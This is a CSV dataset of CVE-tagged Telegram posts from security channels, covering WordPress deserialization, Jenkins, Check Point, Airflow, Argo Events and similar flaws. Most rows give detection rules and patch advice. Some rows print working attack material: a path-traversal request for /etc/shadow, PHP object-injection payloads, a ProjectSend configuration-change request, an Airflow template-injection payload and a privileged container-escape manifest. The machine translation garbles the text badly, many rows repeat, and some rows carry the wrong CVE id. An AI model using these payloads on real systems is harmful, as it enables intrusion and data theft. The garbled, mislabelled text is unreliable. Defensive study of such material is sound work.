id,cve_id,channel_name,message,timestamp,message_url
99,CVE-2024-24926,four_rays,"Again, WordPress, again the downstance of the CVE-2024-24926 data allows the attacker to send malicious objects to the server using the WordPress Brooklyn theme. Potentially, the operation of this vulnerability can lead to remote code execution. CWE-502 CVSS 7.5 We strongly recommend to upgrade! POC can already be found in GitHub. Imagine the useful load necessary for operation: `` `DATA = O: 15:"" Maliciousobject "": 1: {S: 3:"" CMD ""; S: 14:"" SYSTEM``` 'The mechanism of operation is similar to (the only difference is the location of the efficiency. If you use WordPress Brooklyn, then to protect yourself to protect yourself We advise blocking posts with Body, corresponding to the regular expression: `` `O: \ d+: \""+\ "": \ d+:: \ d+| {})` `` `` `` `` `` `` `` `` `` `` ``",2025-06-01 01:34:21.694573,https://t.me/four_rays/24
100,CVE-2024-52433,four_rays,"Again, WordPress, again the downstance of the CVE-2024-24926 data allows the attacker to send malicious objects to the server using the WordPress Brooklyn theme. Potentially, the operation of this vulnerability can lead to remote code execution. CWE-502 CVSS 7.5 We strongly recommend to upgrade! POC can already be found in GitHub. Imagine the useful load necessary for operation: `` `DATA = O: 15:"" Maliciousobject "": 1: {S: 3:"" CMD ""; S: 14:"" SYSTEM``` 'The mechanism of operation is similar to (the only difference is the location of the efficiency. If you use WordPress Brooklyn, then to protect yourself to protect yourself We advise blocking posts with Body, corresponding to the regular expression: `` `O: \ d+: \""+\ "": \ d+:: \ d+| {})` `` `` `` `` `` `` `` `` `` `` ``",2025-06-01 01:34:21.694582,https://t.me/four_rays/24
101,CVE-2024-41713,four_rays,"Public POC on the CVE-2024-41713 in Mitel Micollab became known about the appearance of an exploit of exploit to the vulnerability of CVE-2024-41713 in the Nupoint Unified Messaging Mitel Micollab. Successful operation can allow the attacker to carry out the attack of the track due to insufficient input verification. Vulnerable: Nupoint Unified Messaging Mitel Micollab version up to 9.8 SP1 FP2 CWE-22 SEVERYTY: High 7.5 We strongly recommend updating! (Using the design of the type `..;/`, an attacker can receive various insensitive systemic information, including only accessible to the administrator. For example, a request: `` `` `will issue information about NPM-PWG:-AWCMMANDS;-VERSION. It was also revealed that the use of` ../ `/` will be accurately such Information, in the exploitation found, passes through the NPM-PWG, but its presence is not necessary, since the emulation was revealed that it is possible to bypass the directory from any place. From specific POC from public prostration, you can expand regular expression to `` npm-pwg \/`` `` ``",2025-06-01 01:34:21.694777,https://t.me/four_rays/23
102,CVE-2024-11680,four_rays,"We find the operation of the CVE-2024-11680 in the ProjectSend CWE-287 Base Score: 9.8 Critical, this vulnerability allows remote non-authentic attackers to change the configuration of the ProjectSend application. All versions to R1720 are vulnerable. We strongly recommend to upgrade! The attacker can send a post-call, which is as follows: `` `post /Options.php http/2 host: xxx.com user-agent: Mozilla/5.0 Applewebkit/605.1.15 Version/605.1.115 Content-LENGTH: 117 CONTENT-TYPE: Application/X-WWWW-FORM-URELENCODED COOKIE: PHPSESSID = SFH3JS6atMATSJL1PCTL86 ACCEPT-ENCODING: Gzip CSRFTOKEN = & Section = General & thisInstalltitle = DSDASD``` We analyzed public patterns for scanning this vulnerability and reproduced harmful activity on the test stand: 1. With the value of `hidden` in` type 'and the name Csrftocken. `` `<input Type ="" Hidden ""name ="" csrftocken ""value =""/""/>` `` 2. The meaning of the Section block can be different, for example, `clients` or` General`. 3. The value of the block `thisinstalltitle` can be absolutely any line that will be displayed on the main page. This is not a mandatory block of request, it can be replaced. Clientscanregister = 1 ClientsautoApprove = 1 Clientscanupload = 1 attackers can use various combinations. The best way to protect yourself from this vulnerability is to block all posts on `/options.php`. Another option is to prohibit all the posts containing the `scrftocken` and` secation 'parameters in the body of the council: for greater flexibility in detecting logic, these fields must be made not sensitive to the register.",2025-06-01 01:34:21.695154,https://t.me/four_rays/21
103,CVE-2024-52433,four_rays,"Another WordPress plugin. CVE-2024-52433. Not so long ago it became known about the vulnerability in the plugin WordPress Mindstien Technologies My Geo Posts Free, which received the CVE-2024-52433 identifier. Due to the vulnerability of the deserization of unreliable data, an attacker can introduce objects that can subsequently be used as chains leading to RCE. All versions of the plugin to 1.2 are affected. If your application is written using the Mindstien Technologies My Geo Posts Free plugin, we strongly recommend that you check the versions and renew as Vendor's patch exits. In the process of emulation, we found that operation is possible due to the vulnerability of the next plug -in code of the Mindstien Technologies My Geo Posts Free: `` $ mdata = Unserialize)); mgpfgeocoockie with the meaning, suppose, tzoxndoivnvsbmvywjszunszunsijoxontzojoxojcojcojcojcojcojco Base64Decode, which converts the converted line into `` `O: 14:"" VulnerableClass "": 1: {S: 7:"" Command ""; S: 12:"" Echo 'Hacked!' """"} `` `` `` `` stripslashees, which removes slash, in our example they are not; 3) Finally, after performing `Unserialize`, the $ Object` object will be a specimen of the VulnerableClass class with the attribute` Command` equal to `echo 'hacked!'`, For example `` `vulneraBleClass object (=> echo 'Hacked!') `` `Therefore, if we have a class like this:` `Class VulneraBleClass {Public $ Command; Public Function Wakeup {System; }} `` `Then using the vulnerability of the implementation of the object, you can execute an arbitrary code. We will share the detecting logic, which will allow to block the operation of this vulnerability. It is necessary to block all the requests containing the cookie `mgpfgeocoockie ', the value of which when decoding from Base64 will give a serialized line for storing an object; This line can be described by the following regular expression: `` `O: \ D+: \""+\ "": \ D+:: \ D+| {})` `` `` `",2025-06-01 01:34:21.695919,https://t.me/four_rays/17
104,CVE-2024-42640,four_rays,"How to detect the operation of the CVE-2024-42640 not so long ago it became known about the vulnerability in Angular-Base64-Upload, which is called the CVE-2024-42640. This vulnerability allows the attacker to download arbitrary files to the server. All versions are affected to 0.1.21. So, if your application is written using an Angular framework, we strongly recommend checking the versions. During the emulation of this activity, the SOLAR 4RAYS team became obvious that the operation of vulnerability involves loading an arbitrary file on a server, to which you can subsequently access through `/uploads`. These actions lead to the possibility of performing an arbitrary code on the target server. We will share the detective logic, which will allow you to block the operation of this vulnerability: 1. Block all `post` requests for URI containing` demo/server.php` and bodya transmitting a file with extensive expansion, for example `` `PHP | SH | EXE | PL | jSP | ASP | Bash | pHP+| pht | pHPT | PHTML | ASPX`` 2. You can also add blocking rules to the executable files located in the`/uploads' Directory",2025-06-01 01:34:21.698637,https://t.me/four_rays/6
105,CVE-2025-24365,purple_medved,"VaultWarden - Improper Access Control and RCE literally yesterday, the cool reserve Elizar Batin from `Bi.zone` (Technical details 2 vulnerabilities found as part of the study (this is a very popular implementation of the` Bitwarden 'server, combined with official customers of this password password The manager, which according to the statistics of the company `Bi.zone` is used in 10% of all companies in our country. incorrect logic of the function (used to verify the belonging of a particular user to `uuid` specific` Organization`. Details of operation are described in detail in the RCE blog on the `vaultwarden server through access to the web interface of the administrator panel. Operation is to use the command to use the SMTP messages using` Sendmail` I really liked the payload through `bin/sh`, first we change the path` to the Iconcachefolder 'to the PNG metadata server controlled by the payload. The absolute path to our Payloada in the `From Address` field and send a message that will perform our useful load.",2025-06-01 01:34:31.392510,https://t.me/purple_medved/342
106,CVE-2025-24365,purple_medved,"VaultWarden - Improper Access Control and RCE literally yesterday, the cool reserve Elizar Batin from `Bi.zone` (Technical details 2 vulnerabilities found as part of the study (this is a very popular implementation of the` Bitwarden 'server, combined with official customers of this password password The manager, which according to the statistics of the company `Bi.zone` is used in 10% of all companies in our country. incorrect logic of the function (used to verify the belonging of a particular user to `uuid` specific` Organization`. Details of operation are described in detail in the RCE blog on the `vaultwarden server through access to the web interface of the administrator panel. Operation is to use the command to use the SMTP messages using` Sendmail` I really liked the payload through `bin/sh`, first we change the path` to the Iconcachefolder 'to the PNG metadata server controlled by the payload. The absolute path to our Payloada in the `From Address` field and send a message that will perform our useful load.",2025-06-01 01:34:31.392909,https://t.me/purple_medved/342
107,CVE-2025-24364,purple_medved,"VaultWarden - Improper Access Control and RCE literally yesterday, the cool reserve Elizar Batin from `Bi.zone` (Technical details 2 vulnerabilities found as part of the study (this is a very popular implementation of the` Bitwarden 'server, combined with official customers of this password password The manager, which according to the statistics of the company `Bi.zone` is used in 10% of all companies in our country. incorrect logic of the function (used to verify the belonging of a particular user to `uuid` specific` Organization`. Details of operation are described in detail in the RCE blog on the `vaultwarden server through access to the web interface of the administrator panel. Operation is to use the command to use the SMTP messages using` Sendmail` I really liked the payload through `bin/sh`, first we change the path` to the Iconcachefolder 'to the PNG metadata server controlled by the payload. The absolute path to our Payloada in the `From Address` field and send a message that will perform our useful load.",2025-06-01 01:34:31.392927,https://t.me/purple_medved/342
108,CVE-2025-24364,purple_medved,"VaultWarden - Improper Access Control and RCE literally yesterday, the cool reserve Elizar Batin from `Bi.zone` (Technical details 2 vulnerabilities found as part of the study (this is a very popular implementation of the` Bitwarden 'server, combined with official customers of this password password The manager, which according to the statistics of the company `Bi.zone` is used in 10% of all companies in our country. incorrect logic of the function (used to verify the belonging of a particular user to `uuid` specific` Organization`. Details of operation are described in detail in the RCE blog on the `vaultwarden server through access to the web interface of the administrator panel. Operation is to use the command to use the SMTP messages using` Sendmail` I really liked the payload through `bin/sh`, first we change the path` to the Iconcachefolder 'to the PNG metadata server controlled by the payload. The absolute path to our Payloada in the `From Address` field and send a message that will perform our useful load.",2025-06-01 01:34:31.392939,https://t.me/purple_medved/342
109,CVE-2024-43405,purple_medved,"(We will begin the first working day with a vulnerability review in Nuclei, which can lead to RCE on the scanner server. From the version (it became possible to perform the code on the hosts with `Code Protocol`, which allows you to create templates with more complex logic and significantly expands the capabilities of the scanner. The same release has the possibility of signing and checking the template. The essence of this The vulnerability in the possibility of bypassing this mechanism to add malicious code and its implementation from the signed template. `` And since the logic for checking the signature suggests that only the first entry and symbols of `\\ r` will be interpreted by the regiox parser as part of the line, and Yaml will consider them to be indicated by the string of line A before calculating the hash removes all the lines with`# digest: `You can insert the malicious code into the second The entry and it will successfully pass the verification and will be completed: ` # digest: <valid-signature> # digest: <injected-signature> \ rcode: \ r \ r enterine: \ r-sh \ r echo"" this is thus is Injected and Executed! ""> /TMP /Payload.txt` Thus, we are updated to the version (and it is better to never use other people's template without additional verification of the contents, especially if it is all sorts of aggregators (",2025-06-01 01:34:31.395848,https://t.me/purple_medved/326
110,CVE-2024-47176,purple_medved,"Uowprint ( - my good friend, a legendary researcher and a talented developer of popular tools used by hundreds of thousands of people, created the next cool project without the need to install drivers. I have an old -like MFP `HP Laserjet M1123` and I remember how much time and suffering many years ago it took for him for` ARMV7` 3rd raspberry and get `cups` so that you can simply print, usually very thoughtfully and slowly` uowprint 'perfectly works directly out of the box, just connect the printer on the USB, raise the access point or connects to the client’s home network using a web interface and enjoy the ability to print and scan that this is a non-commercial project to support developers. With an open source, the device for 2000 rubles is the cost of a one -payer of the `Orange Pi 3G -Iot -a` with an acrylic corps and pre -installed software` uowprint` from each amount sold - $ 2 go to the main developers `cups`, $ 2 - developers - developers - developers - developers - developers - developers - developers `Sane/Airsane`, and another $ 2 are used to finance the improvement of the Drivers` Canon Capt `. All devices are sold, follow the updates to Printserver.ink",2025-06-01 01:34:31.399618,https://t.me/purple_medved/301
111,CVE-2024-47175,purple_medved,"Uowprint ( - my good friend, a legendary researcher and a talented developer of popular tools used by hundreds of thousands of people, created the next cool project without the need to install drivers. I have an old -like MFP `HP Laserjet M1123` and I remember how much time and suffering many years ago it took for him for` ARMV7` 3rd raspberry and get `cups` so that you can simply print, usually very thoughtfully and slowly` uowprint 'perfectly works directly out of the box, just connect the printer on the USB, raise the access point or connects to the client’s home network using a web interface and enjoy the ability to print and scan that this is a non-commercial project to support developers. With an open source, the device for 2000 rubles is the cost of a one -payer of the `Orange Pi 3G -Iot -a` with an acrylic corps and pre -installed software` uowprint` from each amount sold - $ 2 go to the main developers `cups`, $ 2 - developers - developers - developers - developers - developers - developers - developers `Sane/Airsane`, and another $ 2 are used to finance the improvement of the Drivers` Canon Capt `. All devices are sold, follow the updates to Printserver.ink",2025-06-01 01:34:31.399637,https://t.me/purple_medved/301
112,CVE-2024-47076,purple_medved,"Uowprint ( - my good friend, a legendary researcher and a talented developer of popular tools used by hundreds of thousands of people, created the next cool project without the need to install drivers. I have an old -like MFP `HP Laserjet M1123` and I remember how much time and suffering many years ago it took for him for` ARMV7` 3rd raspberry and get `cups` so that you can simply print, usually very thoughtfully and slowly` uowprint 'perfectly works directly out of the box, just connect the printer on the USB, raise the access point or connects to the client’s home network using a web interface and enjoy the ability to print and scan that this is a non-commercial project to support developers. With an open source, the device for 2000 rubles is the cost of a one -payer of the `Orange Pi 3G -Iot -a` with an acrylic corps and pre -installed software` uowprint` from each amount sold - $ 2 go to the main developers `cups`, $ 2 - developers - developers - developers - developers - developers - developers - developers `Sane/Airsane`, and another $ 2 are used to finance the improvement of the Drivers` Canon Capt `. All devices are sold, follow the updates to Printserver.ink",2025-06-01 01:34:31.399646,https://t.me/purple_medved/301
113,CVE-2024-41111,purple_medved,"In my (at the last spring, the `Positive Hack Days Fest 2 Cyber ​​Festival, I talked about why it was important to ensure an integrated approach to the security of attacking infrastructure. Including mentioned serious ugly in the 2 open source frames. In the continuation of this topic, I came across an article (in which the author considered it considered Found bugs for popular and not very C2 frameworks: `Sliver` once a favorite has been my favorite, and now they have found a rather cool bug (essentially Command Injection in the MSFvenom argument, which Sliver uses MSF Stagers.` Havoc` gaining popularity Freimvork on Go C 3 bugs :. `ninja s2`, Framwork based on the jubilant sources of the Iranian` Apt Muddywater`, RCE was noted through Unaauthenticated Arbitiry File Download Traver of the tool. `Shad0w` Unauthedicated RCE is another interesting bug, the operation of which is that the Situational AWarence data on architecture, domain, versions of the BEACON'A on the server, are used as a parameter for compilation of post-exploration models It was also one of my favorites, the Authenticated Command Injection and thus, all the Freimvorki considered, with the exception of `mythic` (which are already repeatedly (prone to serious yields that are at risk of attacking attacking infrastructure and, as a result to data and infra of the test organization.",2025-06-01 01:34:31.400472,https://t.me/purple_medved/297
114,CVE-2024-41570,purple_medved,"In my (at the last spring, the `Positive Hack Days Fest 2 Cyber ​​Festival, I talked about why it was important to ensure an integrated approach to the security of attacking infrastructure. Including mentioned serious ugly in the 2 open source frames. In the continuation of this topic, I came across an article (in which the author considered it considered Found bugs for popular and not very C2 frameworks: `Sliver` once a favorite has been my favorite, and now they have found a rather cool bug (essentially Command Injection in the MSFvenom argument, which Sliver uses MSF Stagers.` Havoc` gaining popularity Freimvork on Go C 3 bugs :. `ninja s2`, Framwork based on the jubilant sources of the Iranian` Apt Muddywater`, RCE was noted through Unaauthenticated Arbitiry File Download Traver of the tool. `Shad0w` Unauthedicated RCE is another interesting bug, the operation of which is that the Situational AWarence data on architecture, domain, versions of the BEACON'A on the server, are used as a parameter for compilation of post-exploration models It was also one of my favorites, the Authenticated Command Injection and thus, all the Freimvorki considered, with the exception of `mythic` (which are already repeatedly (prone to serious yields that are at risk of attacking attacking infrastructure and, as a result to data and infra of the test organization.",2025-06-01 01:34:31.400486,https://t.me/purple_medved/297
115,CVE-2024-23897,purple_medved,"CVE-2024-43044: from File Read to RCe in Jenkins published `Path Traversal`, leading to remote execution of code on the servers` jenkins`. The essence of the bugs is that the connected agent can read arbitrary files from the controller using the classic `Path Traversal` in` Classloaderproxy#Fetchjar '`Remoting/Hudson Library`, which is responsible for obtaining jar files from the controller to agents. Having received the ability to read files, you can operate `. The published exploit has several operating modes for `Inbound` or `ssh` methods of connecting agents to the controller and automatically unloads Hashi passwords of all users in` John The Ripper 'format, having broken off a car with an agent, the attacking gets the opportunity to develop an attack on the server `jenkins` With agents. POC: Vulnerable versions according to: jenkins to the version of Jenkins 2.471 and LTS 2.452.4, LTS 2.462.1 Recommendations: (must be updated to version 32.471 and LTS 2.452.4, LTS 2.462.1",2025-06-01 01:34:31.401801,https://t.me/purple_medved/285
116,CVE-2024-43044,purple_medved,"CVE-2024-43044: from File Read to RCe in Jenkins published `Path Traversal`, leading to remote execution of code on the servers` jenkins`. The essence of the bugs is that the connected agent can read arbitrary files from the controller using the classic `Path Traversal` in` Classloaderproxy#Fetchjar '`Remoting/Hudson Library`, which is responsible for obtaining jar files from the controller to agents. Having received the ability to read files, you can operate `. The published exploit has several operating modes for `Inbound` or `ssh` methods of connecting agents to the controller and automatically unloads Hashi passwords of all users in` John The Ripper 'format, having broken off a car with an agent, the attacking gets the opportunity to develop an attack on the server `jenkins` With agents. POC: Vulnerable versions according to: jenkins to the version of Jenkins 2.471 and LTS 2.452.4, LTS 2.462.1 Recommendations: (must be updated to version 32.471 and LTS 2.452.4, LTS 2.462.1",2025-06-01 01:34:31.401814,https://t.me/purple_medved/285
117,CVE-2024-43044,purple_medved,"CVE-2024-43044: from File Read to RCe in Jenkins published `Path Traversal`, leading to remote execution of code on the servers` jenkins`. The essence of the bugs is that the connected agent can read arbitrary files from the controller using the classic `Path Traversal` in` Classloaderproxy#Fetchjar '`Remoting/Hudson Library`, which is responsible for obtaining jar files from the controller to agents. Having received the ability to read files, you can operate `. The published exploit has several operating modes for `Inbound` or `ssh` methods of connecting agents to the controller and automatically unloads Hashi passwords of all users in` John The Ripper 'format, having broken off a car with an agent, the attacking gets the opportunity to develop an attack on the server `jenkins` With agents. POC: Vulnerable versions according to: jenkins to the version of Jenkins 2.471 and LTS 2.452.4, LTS 2.462.1 Recommendations: (must be updated to version 32.471 and LTS 2.452.4, LTS 2.462.1",2025-06-01 01:34:31.401821,https://t.me/purple_medved/285
118,CVE-2024-23897,purple_medved,"CVE-2024-43044: from File Read to RCe in Jenkins published `Path Traversal`, leading to remote execution of code on the servers` jenkins`. The essence of the bugs is that the connected agent can read arbitrary files from the controller using the classic `Path Traversal` in` Classloaderproxy#Fetchjar '`Remoting/Hudson Library`, which is responsible for obtaining jar files from the controller to agents. Having received the ability to read files, you can operate `. The published exploit has several operating modes for `Inbound` or `ssh` methods of connecting agents to the controller and automatically unloads Hashi passwords of all users in` John The Ripper 'format, having broken off a car with an agent, the attacking gets the opportunity to develop an attack on the server `jenkins` With agents. POC: Vulnerable versions according to: jenkins to the version of Jenkins 2.471 and LTS 2.452.4, LTS 2.462.1 Recommendations: (must be updated to version 32.471 and LTS 2.452.4, LTS 2.462.1",2025-06-01 01:34:31.401829,https://t.me/purple_medved/285
119,CVE-2024-39877,purple_medved,"Apache Airflow SSTI to RCE Today we will consider, which allows `RCE` through the operation of` sSti` in the context of the component `Scheduler Airflow`` Airflow `- this is Python to create, execution and management of data processing operations created 2014 in `Airbnb`, which has become widespread in various companies around the world. The essence of vulnerability is the absence of sanitation when processing the `docmd` parameter, which creates a description of the` DAG `in the` apache airflow 'web interface. If Docmd does not have an extension .MD `Airflow` creates a template from the content of` jinja2.template` that leads to sSTI: `doCmd ="" ​​""{{{'' .Class.mro.subclasses}}"" `This paleoad allows you to get a list of all classes using `Mro`, then we wind up to `Command Injection 'using accessible dangerous methods for successful operation, it is necessary to have the right to create DAG'S on the server` Apache Airflow`, which does not allow the use of a bug for piercing, but as a method of non -standard consolidation, the working method vulnerable versions of the software: Apache Airflow 2.4.0 to version 2.9.3 Recommendations: (It is necessary to update to version 2.9.3",2025-06-01 01:34:31.402435,https://t.me/purple_medved/278
120,CVE-2024-4956,purple_medved,"At the end of last month, the classic `Path Traversal` in` Sonatype nexus repository 3.x ', this vulnerability, despite the underestimated assessment of criticality has a great potential for the development of `Supply Chain` Attas, due to the widespread use of` Open-Source' versions of this in different ways companies around the world. , images of Docker, Python, Ruby, NPM, Bower, RPM packets, Gitlfs, Apt, GO, Nuget`, etc. The operation is very trivial and allows not an authenticated attacker to access the files on the server: `Curl, but let's assume that we do not just want to read files, but get access to access And to prolong artifacts for the development of further attacks `nexus` for authentication uses` Apache Shiro 1` Heshi, which can be read from `Orientdb .pcl 'Files by operating this vulnerabilities, but the problem was that the original` Hashcat` did not know how to v` shiro 1` `DYLAN EVANS` AKA` FIN3SS3G0D` did not write for him (and at the same time (this operating vector POC: Shodan: `Title:"" Sonatype Nexus Repository ""` nuclei Template: vulnerable versions of: `Sonatype nexus Repository OSS/Pro` to version 3.68.1 Recommendations: (It is necessary to update to version 3.68.1",2025-06-01 01:34:31.405931,https://t.me/purple_medved/257
121,CVE-2024-4956,purple_medved,"At the end of last month, the classic `Path Traversal` in` Sonatype nexus repository 3.x ', this vulnerability, despite the underestimated assessment of criticality has a great potential for the development of `Supply Chain` Attas, due to the widespread use of` Open-Source' versions of this in different ways companies around the world. , images of Docker, Python, Ruby, NPM, Bower, RPM packets, Gitlfs, Apt, GO, Nuget`, etc. The operation is very trivial and allows not an authenticated attacker to access the files on the server: `Curl, but let's assume that we do not just want to read files, but get access to access And to prolong artifacts for the development of further attacks `nexus` for authentication uses` Apache Shiro 1` Heshi, which can be read from `Orientdb .pcl 'Files by operating this vulnerabilities, but the problem was that the original` Hashcat` did not know how to v` shiro 1` `DYLAN EVANS` AKA` FIN3SS3G0D` did not write for him (and at the same time (this operating vector POC: Shodan: `Title:"" Sonatype Nexus Repository ""` nuclei Template: vulnerable versions of: `Sonatype nexus Repository OSS/Pro` to version 3.68.1 Recommendations: (It is necessary to update to version 3.68.1",2025-06-01 01:34:31.405946,https://t.me/purple_medved/257
122,CVE-2021-40444,purple_medved,"Analysis of TTPS APT groups based on TI reports, as well as the development and testing of atomic test cases for realized scenarios, always takes a certain time at the stage of preparation for `Purple Teaming`. Therefore, we always try to first find a normal analytics with technical details, without marketing water and ""Highly Sophisticated"" formulations recently caught my eye very very much (which I would like to recommend in this note. The author disagree in detail and publishes the finished plan and the necessary tools for simulating the script in Purple Teaming format. the latter-(Create Dall Downloads Files Through Base64, this is to Download Two FIRST IS the Second IsPloiting CVE-2021-40444 to Inject The DLL File Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word Into Word File and Create an Execution for DLL By Opening Word File File Is Running and the Actual Payload is Downloadnloader.dll and We have Two Files Stager.dll and dfsvc.dll the stager decrypts the Actual Payload and Runs it is in turn is responsible for command and control Data OveronDrive API C2. Traffic Whithin Legitimate OneDrive Communication Get Command and Control Payload Uses the OneDrive Api to upload Dating Output to OneDDRIVE, The Payload Calculates The CRC32 Checksum of the Machineguid and Includes it in the Communication with The Server for Identification Purposes in the result is a ready -made scenario that can be customized and used for conducting `Purple Teaming`.",2025-06-01 01:34:31.406426,https://t.me/purple_medved/253
123,CVE-2024-24919,purple_medved,"Check Point - You desert ~~ the Best Security ~~ An Arbitory File Read after a small break, we return to the technical content and today I propose to talk about the vulnerant of the unauthorized attacker in the wild, which allows an unauthorized attacker to read arbitrary files on the devices Check Point with the IPSEC VPN, Remote Access VPN and Mobile Access. Technical details published in (reveal the details of operation, the essence of which consists in the classic Path Traversal with privileges of the ROOT user, leading to reading any files on the device, for example, the passwords of users, SESSION TOKENS, configuration files. Post/clients/MyCRL HTTP/1.1 Host: Target.com Content-legth: 41 AcShell /../../../../../../../../../ ETC/Shadow according to (on 31.05 on the Internet, 13.802 potentially vulnerable devices. Poc: Bulk Scanner: Shodan: Title: ""Check Point"" ||. R77.30, R80.10, R80.20, R80.20.X, R80.20SP, R80.30, R80.30SP, R80.40, R81, R81.10, R81.10.x, R81.20 Recommendations: (",2025-06-01 01:34:31.407385,https://t.me/purple_medved/250
124,CVE-2024-24919,purple_medved,"Check Point - You desert ~~ the Best Security ~~ An Arbitory File Read after a small break, we return to the technical content and today I propose to talk about the vulnerant of the unauthorized attacker in the wild, which allows an unauthorized attacker to read arbitrary files on the devices Check Point with the IPSEC VPN, Remote Access VPN and Mobile Access. Technical details published in (reveal the details of operation, the essence of which consists in the classic Path Traversal with privileges of the ROOT user, leading to reading any files on the device, for example, the passwords of users, SESSION TOKENS, configuration files. Post/clients/MyCRL HTTP/1.1 Host: Target.com Content-legth: 41 AcShell /../../../../../../../../../ ETC/Shadow according to (on 31.05 on the Internet, 13.802 potentially vulnerable devices. Poc: Bulk Scanner: Shodan: Title: ""Check Point"" ||. R77.30, R80.10, R80.20, R80.20.X, R80.20SP, R80.30, R80.30SP, R80.40, R81, R81.10, R81.10.x, R81.20 Recommendations: (",2025-06-01 01:34:31.407396,https://t.me/purple_medved/250
125,CVE-2024-0132,k8security,"More recently, the next `pwn2own` contest took place. It is noteworthy that the organizers have introduced the new category of `AI` with such targets as:` - Chroma - Postgres Pgvector - Redis - Ollama - Nvidia Triton Inference Server - Nvidia Container Toolkit` Yes, the list contains the same `nvidia content Toolkit` for which we prepared exploit and released (on this score! Researchers from `wiz` in the framework of` pwn2own` (another bug in this Tulkit. Officially neither appropriation `cve` nor patch still, as usual, after the opening of` 0-day` during the competition `pwn2own` has` 90` The preparation and release of a patch for his products before `Trend Micro Zero Day will publish technical details.",2025-06-01 01:34:34.874785,https://t.me/k8security/1538
126,CVE-2024-0132,k8security,"Researchers from `Trend Micro` who found` CVE-2025-23359 `(` Bypass` after the Fix `CVE-2024-0132` We talked about (in which some details were revealed. So for example, they found some performance problems in the container in the container that can lead to DOS : When a new container is created with several mounts, several parental/subsidiaries are installed, however, related notes are not removed from the Linux mount table after the container is completed. It cannot create new containers due to the exhaustion of the FD. `Volume`. `ROOT`, that is, get complete remote control over the compromised system.",2025-06-01 01:34:34.880281,https://t.me/k8security/1507
127,CVE-2024-0132,k8security,"Researchers from `Trend Micro` who found` CVE-2025-23359 `(` Bypass` after the Fix `CVE-2024-0132` We talked about (in which some details were revealed. So for example, they found some performance problems in the container in the container that can lead to DOS : When a new container is created with several mounts, several parental/subsidiaries are installed, however, related notes are not removed from the Linux mount table after the container is completed. It cannot create new containers due to the exhaustion of the FD. `Volume`. `ROOT`, that is, get complete remote control over the compromised system.",2025-06-01 01:34:34.880304,https://t.me/k8security/1507
128,CVE-2025-23359,k8security,"Researchers from `Trend Micro` who found` CVE-2025-23359 `(` Bypass` after the Fix `CVE-2024-0132` We talked about (in which some details were revealed. So for example, they found some performance problems in the container in the container that can lead to DOS : When a new container is created with several mounts, several parental/subsidiaries are installed, however, related notes are not removed from the Linux mount table after the container is completed. It cannot create new containers due to the exhaustion of the FD. `Volume`. `ROOT`, that is, get complete remote control over the compromised system.",2025-06-01 01:34:34.880315,https://t.me/k8security/1507
129,CVE-2025-32445,k8security,"The universe `Argo` is not limited only to` Argo CD`. For example, the vulnerability was recently disclosed (with an assessment of 1`0/10` on `CVSS` in` Argo Events`, which allows the user with the rights to create custom resources `eventsource` and` sensor` to escape from the container and get full control over the cluster. He processed the fields of `securityContext` in` EventSource`, although this was not clearly indicated in the documentation. /Run/Containerd/Containerd.sock`: `` `APIVERSION: Argoproj.io/v1alpha1 kind: eventsource metadata: name: poc-vulnerable-eventsource spec: Webhook: Security-Test: Port: 12000 Endpoint: ""/Webhook"" Template: Container: Image: Ubuntu: Latest Command: Args: [""-c"", ""Apt-Get Update && Apt-Get Install -Curl && Whel True; /TMP/DATA 2> & 1 ;= Proof of Host Access === '>>/TMP/Data 2> & 1; Sleep 300; Done ""] SecurityContext: Privileged: True Capabilites: Add: Volumemounts: - Name: Host -Rot MountPath: /Host Volumes: - Name: NAME: NAME `` `In version 1.9.6 the vulnerability was corrected by allowing the user to limit the` .Spec.template.container '.",2025-06-01 01:34:34.880846,https://t.me/k8security/1504
130,CVE-2025-1974,k8security,"Researchers from `wiz` tightly took up the reservation of the next product, this time-I`ngress-Nginx Controller`. As a result, there were (5 vulnerabilities, one of which has a `Severity Critical`. Which is interesting, unlike the past` cve`, which was found in the controller, to operate these vulnerabilities, it is not necessary to create a resource `Ingress`. The attacker needs to send harmful requests through` Admission Review` directly `Admission Controller '. They have not published an expert, however, `poc` are already available on (it is funny that for a vulnerability with the maximum criticism` 9.8 `by` cvss` for fixing, they simply made a vulnerable functionality: `` ` / deactivated to mitigate CVE-2025-1974 // Todo: Todo: Todo: Todo: Todo: Todo Implement Sandboxing So this Test Can Be Done Safly``````",2025-06-01 01:34:34.883350,https://t.me/k8security/1482
